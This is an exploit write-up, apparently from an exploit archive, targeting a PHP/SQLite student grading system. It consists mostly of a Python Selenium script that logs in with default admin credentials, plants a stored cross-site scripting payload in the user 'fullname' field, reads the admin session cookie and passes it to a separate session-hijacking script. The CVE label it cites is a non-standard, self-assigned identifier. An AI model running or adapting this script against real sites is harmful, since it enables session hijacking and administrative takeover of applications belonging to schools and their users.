### Exploit Title: Student Quarterly Grading System (by: oretnom23 ) is vulnerable to XSS-Stored Hijacking PHPSESSID local PWNED
### Author: nu11secur1ty
### Testing and Debugging: nu11secur1ty 
### Date: 09.21.2021
### Vendor: https://www.sourcecodester.com/user/257130/activity
### Link: https://www.sourcecodester.com/php/14953/student-quarterly-grading-system-using-php-and-sqlite-free-source-code.html
### CVE: CVE-nu11-15-092121

[+] Exploit Source: 

#!/usr/bin/python3
# Author: @nu11secur1ty
# Debug and Developement: @nu11secur1ty 
# CVE-nu11-15-092121

from selenium import webdriver
import time
import os
from colorama import init, Fore, Back, Style
init(convert=True)
import requests


#enter the link to the website you want to automate login.
website_link="http://192.168.1.180/grading_system/login.php"

#enter your login username
username="admin"

#enter your login password
password="admin123"

#enter the element for username input field
element_for_username="username"
#enter the element for password input field
element_for_password="password"

browser = webdriver.Chrome()
browser.get((website_link))	

try:
	username_element = browser.find_element_by_name(element_for_username)
	username_element.send_keys(username)		
	password_element  = browser.find_element_by_name(element_for_password)
	password_element.send_keys(password)
	browser.maximize_window()
	time.sleep(1)
	browser.execute_script("document.querySelector('[class=\"btn btn-sm btn-primary rounded-0 my-1\"]').click()")
	
	time.sleep(1)
	exploit_link="http://192.168.1.180/grading_system/?page=users"
	browser.get((exploit_link))
	browser.execute_script("document.querySelector('[class=\"btn btn-dark btn-sm py-1 rounded-0\"]').click()")
	
	time.sleep(3)
	browser.execute_script("document.querySelector('[id=\"fullname\"]').value=\"<script>alert(document.cookie)</script>\"")
	browser.execute_script("document.querySelector('[id=\"username\"]').value=\'PWNED'")
	
	time.sleep(1)
	browser.execute_script("document.querySelector('[class=\"btn btn-sm rounded-0 btn-primary\"]').click()")
	
	coockie=browser.execute_script("return document.cookie")
	coockie=coockie.split("=")[1]
	print(coockie)
	browser.close()
	
	time.sleep(3)
	os.system("python PWNPHPSESSID.py " + coockie)
	
	print(Fore.GREEN +"The payload for CVE-nu11-15 is deployed...\n")
	print(Style.RESET_ALL)
	
except Exception:
	#### This exception occurs if the element are not found in the webpage.
	print("Some error occured :(")


------------------------------------------------------------------

### Description:
The XSS - Stored PHPSESSID Hijacking Vulnerable local PWNED
The vulnerable app: is "users", with parameters: "fullname" and "username".
After the successful PWNED of the credentials for the admin account.
The malicious user can be storing an XSS payload, whit who can take the active PHPSESSID
every time when he wants to log in to the system with an admin account by using this exploit.

-------------------------------------------------------------------
### BR 
- [+] @nu11secur1ty System Administrator - Infrastructure and Penetration Testing Engineer

-------------------------------------------------------------------
### Reproduce: 
### Proof: 
### BR nu11secur1ty
